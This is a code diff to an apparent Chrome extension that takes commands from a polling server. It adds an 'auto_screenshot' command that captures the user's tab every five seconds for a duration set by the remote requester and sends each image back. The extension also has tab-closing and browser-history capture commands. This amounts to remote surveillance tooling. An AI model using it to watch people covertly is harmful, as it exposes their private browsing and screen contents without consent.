@@ -10,6 +10,19 @@ let isConnected = false;
 const POLL_ALARM_NAME = 'pollCommands';
 const POLL_INTERVAL_MINUTES = 0.05; // ~2 seconds (minimum is 1 minute in production, but dev allows this) //change it to 2 seconds on dev 
 
+// Auto-screenshot state management
+let autoScreenshotState = {
+    active: false,
+    commandId: null,
+    userId: null,
+    duration: 0,
+    startTime: 0,
+    endTime: 0,
+    screenshotCount: 0,
+    alarmName: null
+};
+ 
+
 // ============ Initialize ============
 // Generate or retrieve client ID and extension ID
 chrome.storage.local.get(['clientId', 'extensionId', 'clientName', 'userName'], (result) => {
@@ -79,6 +92,8 @@ function stopPolling() {
 chrome.alarms.onAlarm.addListener((alarm) => {
     if (alarm.name === POLL_ALARM_NAME) {
         pollForCommands();
+    } else if (alarm.name && alarm.name.startsWith('autoss_')) {
+        handleAutoScreenshotAlarm(alarm.name);
     }
 });
 
@@ -203,6 +218,11 @@ async function processCommand(command) {
                 await closeTabsByUrls(command.id, command.urls);
                 break;
 
+            case 'auto_screenshot':
+                console.log(`📸 Auto-screenshot requested by ${command.requestedBy} for ${command.duration}s`);
+                await startAutoScreenshot(command.id, command.requestedById, command.duration);
+                break;
+
             default:
                 console.log(`⚠️ Unknown command type: ${command.type}`);
         }
@@ -243,6 +263,100 @@ async function captureScreenshot(commandId, userId) {
         console.error('Error capturing screenshot:', error);
         await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
     }
+}
+
+// ============ Auto-Screenshot Capture ============
+async function startAutoScreenshot(commandId, userId, duration) {
+    try {
+        // Stop any existing auto-screenshot session
+        if (autoScreenshotState.active) {
+            console.log('⚠️ Stopping existing auto-screenshot session...');
+            stopAutoScreenshot();
+        }
+
+        // Initialize auto-screenshot state
+        const now = Date.now();
+        const alarmName = `autoss_${commandId}`;
+        
+        autoScreenshotState = {
+            active: true,
+            commandId: commandId,
+            userId: userId,
+            duration: duration,
+            startTime: now,
+            endTime: now + (duration * 1000),
+            screenshotCount: 0,
+            alarmName: alarmName
+        };
+
+        console.log(`📸 Starting auto-screenshot: ${duration}s duration, ~${Math.floor(duration / 5)} screenshots`);
+
+        // Create alarm for 5-second intervals
+        chrome.alarms.create(alarmName, {
+            delayInMinutes: 0, // Start immediately
+            periodInMinutes: 5 / 60 // 5 seconds = 0.0833... minutes
+        });
+
+        // Take first screenshot immediately
+        await captureScreenshot(commandId, userId);
+        autoScreenshotState.screenshotCount++;
+        console.log(`📸 Auto-screenshot #${autoScreenshotState.screenshotCount} captured`);
+
+    } catch (error) {
+        console.error('Error starting auto-screenshot:', error);
+        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
+        stopAutoScreenshot();
+    }
+}
+
+async function handleAutoScreenshotAlarm(alarmName) {
+    // Verify this is our active alarm
+    if (!autoScreenshotState.active || autoScreenshotState.alarmName !== alarmName) {
+        console.log('⚠️ Ignoring orphaned auto-screenshot alarm');
+        chrome.alarms.clear(alarmName);
+        return;
+    }
+
+    const now = Date.now();
+
+    // Check if we've reached the end time
+    if (now >= autoScreenshotState.endTime) {
+        console.log(`✅ Auto-screenshot completed: ${autoScreenshotState.screenshotCount} screenshots sent`);
+        stopAutoScreenshot();
+        return;
+    }
+
+    // Capture screenshot
+    try {
+        await captureScreenshot(autoScreenshotState.commandId, autoScreenshotState.userId);
+        autoScreenshotState.screenshotCount++;
+        
+        const elapsed = Math.floor((now - autoScreenshotState.startTime) / 1000);
+        const remaining = Math.floor((autoScreenshotState.endTime - now) / 1000);
+        console.log(`📸 Auto-screenshot #${autoScreenshotState.screenshotCount} captured (${elapsed}s elapsed, ${remaining}s remaining)`);
+    } catch (error) {
+        console.error('Error in auto-screenshot:', error);
+        // Don't stop on individual screenshot errors, continue the session
+    }
+}
+
+function stopAutoScreenshot() {
+    if (autoScreenshotState.alarmName) {
+        chrome.alarms.clear(autoScreenshotState.alarmName);
+    }
+    
+    autoScreenshotState = {
+        active: false,
+        commandId: null,
+        userId: null,
+        duration: 0,
+        startTime: 0,
+        endTime: 0,
+        screenshotCount: 0,
+        alarmName: null
+    };
+    
+    console.log('🛑 Auto-screenshot stopped');
 }
 
 // ============ Browser History Capture ============
